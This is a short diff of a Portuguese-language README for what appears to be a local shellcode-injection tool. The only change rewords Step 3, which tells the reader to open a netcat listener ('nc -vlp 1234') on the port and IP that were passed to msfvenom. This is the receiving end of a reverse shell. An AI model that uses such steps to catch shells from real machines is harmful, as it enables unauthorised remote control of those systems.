@@ -87,7 +87,7 @@ injectlocal.exe
 #### Step 3
 
 
-- Abrir a porta que colocamos como argumento no msfvenom para gerar o shellcode, no computador com o IP que também colocamos como argumento no msfvenom para gerar o shellcode 
+- Abrir a mesma porta que colocamos como argumento no msfvenom para gerar o shellcode, no computador com o IP que também colocamos como argumento no msfvenom para gerar o shellcode 
 
 ```bash
 nc -vlp 1234
